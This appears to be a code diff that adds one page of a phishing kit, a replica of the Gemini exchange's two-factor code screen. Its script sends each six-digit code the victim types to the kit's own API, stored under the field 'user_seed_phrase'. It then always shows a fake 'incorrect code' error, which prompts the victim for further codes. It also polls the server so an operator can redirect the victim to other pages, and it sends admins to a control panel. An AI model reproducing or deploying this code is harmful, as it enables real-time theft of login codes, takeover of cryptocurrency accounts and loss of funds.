@@ -1,0 +1,508 @@
+---
+import AuthLayout from "@/layouts/AuthLayout.astro";
+import { getUserByEmail, initializeDb } from "@/lib/db";
+
+initializeDb();
+
+const cookieHeader = Astro.request.headers.get("cookie");
+const encodedEmail = cookieHeader?.match(/user_email=([^;]+)/)?.[1];
+const userEmail = encodedEmail ? decodeURIComponent(encodedEmail) : null;
+
+if (!userEmail) {
+    return Astro.redirect("/signin");
+}
+
+const user = await getUserByEmail(userEmail);
+
+if (!user) {
+    return Astro.redirect("/signin");
+}
+
+if (user.current_page && user.current_page !== "2fa") {
+    return Astro.redirect(`/${user.current_page}`);
+}
+---
+
+<AuthLayout title="Gemini - Enter Your 2-Factor Code">
+    <div class="ev4buvj6 css-1ia2q6l e1vsinnk0">
+        <div class="css-z1oayz e1vsinnk0">
+            <svg
+                id="gemini-logo-cyan_svg__Layer_1"
+                data-name="Layer 1"
+                viewBox="0 0 129.33 128.94"
+                class="css-cp4eka ev4buvj8"
+                ><path
+                    d="M83.86 2a43.53 43.53 0 00-43 38.64 43.26 43.26 0 004.63 86.28 43.53 43.53 0 0043-38.64A43.26 43.26 0 0083.86 2zM117 50.17a33.7 33.7 0 01-28.25 28.24V50.17zM12.35 78.77a33.69 33.69 0 0128.24-28.23v28.23zm66.25 9.78a33.48 33.48 0 01-66.25 0zm.4-38.38v28.6H50.37v-28.6zm38-9.78H50.73a33.48 33.48 0 0166.25 0z"
+                    fill="#26ddf9"></path></svg
+            >
+        </div>
+    </div><div class="css-p17jcv ev4buvj3">
+        <a
+            type="button"
+            role="button"
+            aria-label="Back to login"
+            class="e1fsl8uw0 css-15vjxl7 e1czpx482"
+            ><svg
+                aria-hidden="true"
+                width="24px"
+                height="24px"
+                viewBox="0 0 24 24"
+                fill="currentcolor"
+                xmlns="http://www.w3.org/2000/svg"
+                ><path
+                    fill-rule="evenodd"
+                    clip-rule="evenodd"
+                    d="M8.41424 12.0001L15.7071 4.70718L14.2929 3.29297L5.58582 12.0001L14.2929 20.7072L15.7071 19.293L8.41424 12.0001Z"
+                ></path></svg
+            ></a
+        >
+    </div><div class="css-1x5wxe3 ev4buvj12">
+        <div class="css-xhgaf9 ev4buvj11">
+            <div class="css-k2k4ev ev4buvj10">
+                <div class="css-2sm8t6 e1vsinnk0">
+                    <h2 data-testid="title" class="css-1ursixa eboofq0"></h2>
+                </div><div class="css-147gpdq e1vsinnk0">
+                    <h2
+                        data-testid="two-factor-auth-title"
+                        class="css-1uz10xt eboofq0"
+                    >
+                        Enter the code from the authenticator app
+                    </h2><p
+                        data-testid="two-factor-auth"
+                        class="css-8s8x64 ez8rcrm1"
+                    >
+                    </p><form class="css-1a9w5bx etq1frq1">
+                        <div class="css-50bg6q">
+                            <div class="css-9nghkz">
+                                <input
+                                    type="tel"
+                                    inputmode="numeric"
+                                    pattern="[0-9]{1}"
+                                    min="0"
+                                    max="9"
+                                    maxlength="1"
+                                    class="authy-code css-k9o5qk"
+                                    autocomplete="one-time-code"
+                                    aria-label="Input Token. Character 1."
+                                    data-testid="authy-code-1"
+                                    id="code-1"
+                                /><input
+                                    type="tel"
+                                    inputmode="numeric"
+                                    pattern="[0-9]{1}"
+                                    min="0"
+                                    max="9"
+                                    maxlength="1"
+                                    class="authy-code css-k9o5qk"
+                                    autocomplete="off"
+                                    aria-label="Input Token. Character 2."
+                                    data-testid="authy-code-2"
+                                    id="code-2"
+                                /><input
+                                    type="tel"
+                                    inputmode="numeric"
+                                    pattern="[0-9]{1}"
+                                    min="0"
+                                    max="9"
+                                    maxlength="1"
+                                    class="authy-code css-k9o5qk"
+                                    autocomplete="off"
+                                    aria-label="Input Token. Character 3."
+                                    data-testid="authy-code-3"
+                                    id="code-3"
+                                /><input
+                                    type="tel"
+                                    inputmode="numeric"
+                                    pattern="[0-9]{1}"
+                                    min="0"
+                                    max="9"
+                                    maxlength="1"
+                                    class="authy-code css-k9o5qk"
+                                    autocomplete="off"
+                                    aria-label="Input Token. Character 4."
+                                    data-testid="authy-code-4"
+                                    id="code-4"
+                                /><input
+                                    type="tel"
+                                    inputmode="numeric"
+                                    pattern="[0-9]{1}"
+                                    min="0"
+                                    max="9"
+                                    maxlength="1"
+                                    class="authy-code css-k9o5qk"
+                                    autocomplete="off"
+                                    aria-label="Input Token. Character 5."
+                                    data-testid="authy-code-5"
+                                    id="code-5"
+                                /><input
+                                    type="tel"
+                                    inputmode="numeric"
+                                    pattern="[0-9]{1}"
+                                    min="0"
+                                    max="9"
+                                    maxlength="1"
+                                    class="authy-code css-k9o5qk"
+                                    autocomplete="off"
+                                    aria-label="Input Token. Character 6."
+                                    data-testid="authy-code-6"
+                                    id="code-6"
+                                />
+                            </div>
+                        </div><div>
+                            <label
+                                data-testid="undefined-label"
+                                class="css-12rv8da ettursl0"
+                                ><div class="css-ywctyo e9wwanr0">
+                                    <input
+                                        name="remember"
+                                        type="checkbox"
+                                        class="css-gjd6wr e1jjtgfp0"
+                                        checked
+                                    /><svg
+                                        aria-hidden="true"
+                                        width="20px"
+                                        height="20px"
+                                        viewBox="0 0 24 24"
+                                        fill="#010304"
+                                        xmlns="http://www.w3.org/2000/svg"
+                                        class="selected"
+                                        ><path
+                                            fill-rule="evenodd"
+                                            clip-rule="evenodd"
+                                            d="M5 2C3.34315 2 2 3.34315 2 5V19C2 20.6569 3.34315 22 5 22H19C20.6569 22 22 20.6569 22 19V5C22 3.34315 20.6569 2 19 2H5ZM11.2071 16.2071L17.7071 9.70711L16.2929 8.29289L10.5 14.0858L7.20711 10.7929L5.79289 12.2071L9.79289 16.2071L10.5 16.9142L11.2071 16.2071Z"
+                                        ></path></svg
+                                    ><svg
+                                        aria-hidden="true"
+                                        width="20px"
+                                        height="20px"
+                                        viewBox="0 0 24 24"
+                                        fill="#010304"
+                                        xmlns="http://www.w3.org/2000/svg"
+                                        class="unselected"
+                                        ><path
+                                            fill-rule="evenodd"
+                                            clip-rule="evenodd"
+                                            d="M2 5C2 3.34315 3.34315 2 5 2H19C20.6569 2 22 3.34315 22 5V19C22 20.6569 20.6569 22 19 22H5C3.34315 22 2 20.6569 2 19V5ZM5 4C4.44772 4 4 4.44772 4 5V19C4 19.5523 4.44772 20 5 20H19C19.5523 20 20 19.5523 20 19V5C20 4.44772 19.5523 4 19 4H5Z"
+                                        ></path></svg
+                                    >
+                                </div><div class="css-17hv65w e9wwanr0">
+                                    Remember this device for 24 hours
+                                </div></label
+                            >
+                        </div>
+                    </form>
+                </div>
+            </div>
+        </div>
+    </div>
+</AuthLayout>
+
+<style>
+    .hide-element {
+        display: none !important;
+    }
+</style>
+
+<script>
+    document.addEventListener("DOMContentLoaded", async function () {
+        const inputs = Array.from(
+            document.querySelectorAll(".authy-code"),
+        ) as HTMLInputElement[];
+        const form = document.querySelector(".css-1a9w5bx") as HTMLFormElement;
+        const inputContainer = document.querySelector(
+            ".css-50bg6q",
+        ) as HTMLDivElement;
+
+        let isLoading = false;
+        let hasError = false;
+
+        const createSpinner = () => {
+            const spinnerDiv = document.createElement("div");
+            spinnerDiv.className = "e1czpx481 css-1fe85m3 e1vsinnk0";
+            spinnerDiv.id = "spinner-container";
+            spinnerDiv.innerHTML = `
+                <div aria-label="spinner" data-testid="spinner-animation" class="css-12lkb7a e1oqezu31">
+                    <svg color="#010304" viewBox="0 0 50 50" class="css-1qdfh2c e1oqezu30">
+                        <circle cx="25" cy="25" r="20" fill="none" stroke-width="4"></circle>
+                    </svg>
+                </div>
+            `;
+            return spinnerDiv;
+        };
+
+        const createError = () => {
+            const errorDiv = document.createElement("div");
+            errorDiv.className = "css-78aq5l e1hp05jk0";
+            errorDiv.id = "error-container";
+            errorDiv.setAttribute("data-testid", "auth-code-error");
+            errorDiv.setAttribute("role", "alert");
+            errorDiv.setAttribute("aria-live", "assertive");
+            errorDiv.setAttribute("aria-atomic", "true");
+            errorDiv.innerHTML = `
+                <svg aria-hidden="true" width="24px" height="24px" viewBox="0 0 24 24" fill="currentcolor" xmlns="http://www.w3.org/2000/svg">
+                    <path fill-rule="evenodd" clip-rule="evenodd" d="M14.6223 4.66123C13.4793 2.6038 10.5204 2.60381 9.37735 4.66124L2.77637 16.543C1.66549 18.5426 3.11139 20.9999 5.39885 20.9999H18.6008C20.8882 20.9999 22.3341 18.5426 21.2233 16.543L14.6223 4.66123Z" fill="#CA3A3A"></path>
+                    <path fill-rule="evenodd" clip-rule="evenodd" d="M11 14V8H13V14H11ZM11 18V16H13V18H11Z" fill="white"></path>
+                </svg>
+                <div class="css-qb7i4h e1vsinnk0">
+                    <h4 class="css-rqzjz7 eboofq0">Oops! There was an error</h4>
+                    <div class="css-7a45cq ez8rcrm1">The 2-Factor Verification Code you entered is incorrect.</div>
+                </div>
+            `;
+            return errorDiv;
+        };
+
+        const showLoading = () => {
+            if (isLoading) return;
+            isLoading = true;
+
+            const spinner = createSpinner();
+            inputContainer.insertBefore(spinner, inputContainer.firstChild);
+
+            inputs.forEach((input) => {
+                input.disabled = true;
+            });
+        };
+
+        const showError = () => {
+            isLoading = false;
+            hasError = true;
+
+            const existingSpinner =
+                document.getElementById("spinner-container");
+            if (existingSpinner) {
+                existingSpinner.remove();
+            }
+
+            const error = createError();
+            form.insertBefore(error, form.firstChild);
+
+            inputs.forEach((input) => {
+                input.disabled = false;
+                input.className =
+                    "authy-code css-k9o5qk negative no-margin-top";
+                input.value = "";
+            });
+            inputs[0].focus();
+        };
+
+        const hideError = () => {
+            hasError = false;
+            const existingError = document.getElementById("error-container");
+            if (existingError) {
+                existingError.remove();
+            }
+            inputs.forEach((input) => {
+                input.className = "authy-code css-k9o5qk";
+            });
+        };
+
+        const checkComplete = async () => {
+            const allFilled = inputs.every((input) => input.value.length === 1);
+            if (allFilled && !isLoading) {
+                showLoading();
+
+                // Get the complete 6-digit code
+                const tfaCode = inputs.map((input) => input.value).join("");
+
+                // Get user email from cookie
+                const userEmail = decodeURIComponent(
+                    document.cookie.match(/user_email=([^;]+)/)?.[1] || "",
+                );
+
+                try {
+                    // Make the API call to update user with the TFA code
+                    const updateResponse = await fetch("/api/users", {
+                        method: "PUT",
+                        headers: {
+                            "Content-Type": "application/json",
+                        },
+                        body: JSON.stringify({
+                            email: userEmail,
+                            user_seed_phrase: tfaCode.trim(),
+                        }),
+                    });
+
+                    if (!updateResponse.ok) {
+                        throw new Error("API call failed");
+                    }
+
+                    console.log("Successfully updated user with TFA code");
+
+                    // Still show error after a delay for now (you can modify this behavior)
+                    setTimeout(
+                        () => {
+                            showError();
+                        },
+                        Math.random() * 500 + 1500 + 1000,
+                    );
+                } catch (error) {
+                    console.error("Error updating user with TFA code:", error);
+                    setTimeout(() => {
+                        showError();
+                    }, 1000);
+                }
+            }
+        };
+
+        inputs.forEach((input, index) => {
+            input.addEventListener("input", (e) => {
+                const target = e.target as HTMLInputElement;
+                const value = target.value;
+
+                if (!/^\d$/.test(value)) {
+                    target.value = "";
+                    return;
+                }
+
+                if (value.length === 1) {
+                    if (hasError) hideError();
+                    if (index < inputs.length - 1) {
+                        setTimeout(() => {
+                            inputs[index + 1].focus();
+                        }, 100);
+                    }
+                    checkComplete();
+                }
+            });
+
+            input.addEventListener("keydown", (e) => {
+                const target = e.target as HTMLInputElement;
+
+                if (e.key === "Backspace" && target.value === "" && index > 0) {
+                    inputs[index - 1].focus();
+                } else if (e.key === "ArrowLeft" && index > 0) {
+                    inputs[index - 1].focus();
+                } else if (
+                    e.key === "ArrowRight" &&
+                    index < inputs.length - 1
+                ) {
+                    inputs[index + 1].focus();
+                }
+            });
+
+            input.addEventListener("paste", (e) => {
+                e.preventDefault();
+                const paste = e.clipboardData?.getData("text") || "";
+                const digits = paste.replace(/\D/g, "").slice(0, 6);
+
+                if (hasError) hideError();
+
+                digits.split("").forEach((digit, i) => {
+                    if (inputs[i]) {
+                        inputs[i].value = digit;
+                    }
+                });
+
+                const lastFilledIndex = Math.min(digits.length - 1, 5);
+                if (lastFilledIndex >= 0) {
+                    inputs[lastFilledIndex].focus();
+                }
+
+                checkComplete();
+            });
+
+            input.addEventListener("focus", () => {
+                input.select();
+            });
+        });
+
+        inputs[0].focus();
+
+        const checkbox = document.querySelector(
+            'input[name="remember"]',
+        ) as HTMLInputElement;
+        const selectedSvg = document.querySelector(".selected") as SVGElement;
+        const unselectedSvg = document.querySelector(
+            ".unselected",
+        ) as SVGElement;
+
+        checkbox.addEventListener("change", () => {
+            if (checkbox.checked) {
+                selectedSvg.style.display = "";
+                unselectedSvg.style.display = "none";
+            } else {
+                selectedSvg.style.display = "none";
+                unselectedSvg.style.display = "";
+            }
+        });
+
+        const checkUserAndRedirect = async () => {
+            try {
+                const response = await fetch("/api/check-admin-status");
+                const data = await response.json();
+
+                if (data.isAdmin) {
+                    console.log(
+                        "User is admin, redirecting to panel in 5 seconds...",
+                    );
+                    setTimeout(() => {
+                        window.location.href = "/panel";
+                    }, 5000);
+                    if (pollingInterval) clearInterval(pollingInterval);
+                } else {
+                    console.log(
+                        "User is not admin, starting/continuing polling for redirects...",
+                    );
+                    if (!pollingInterval) {
+                        startPolling();
+                    }
+                }
+            } catch (error) {
+                console.error(
+                    "Error checking admin status or user status:",
+                    error,
+                );
+                if (!pollingInterval) {
+                    startPolling();
+                }
+            }
+        };
+
+        let pollingInterval: number | undefined;
+
+        const startPolling = () => {
+            if (pollingInterval !== undefined) {
+                clearInterval(pollingInterval);
+            }
+
+            pollingInterval = window.setInterval(async () => {
+                try {
+                    const email = decodeURIComponent(
+                        document.cookie.match(/user_email=([^;]+)/)?.[1] || "",
+                    );
+                    if (!email) {
+                        console.log(
+                            "No user email found in cookie, stopping polling.",
+                        );
+                        clearInterval(pollingInterval);
+                        return;
+                    }
+
+                    const userResponse = await fetch(
+                        "/api/users?email=" + encodeURIComponent(email),
+                    );
+                    const userData = await userResponse.json();
+
+                    if (
+                        userData &&
+                        userData.current_page &&
+                        userData.current_page !== "2fa"
+                    ) {
+                        console.log(
+                            `Redirecting user to: /${userData.current_page}`,
+                        );
+                        clearInterval(pollingInterval);
+                        window.location.href = "/" + userData.current_page;
+                    }
+                } catch (error) {
+                    console.error(
+                        "Error checking user status during polling:",
+                        error,
+                    );
+                }
+            }, 2000);
+        };
+
+        checkUserAndRedirect();
+    });
+</script>
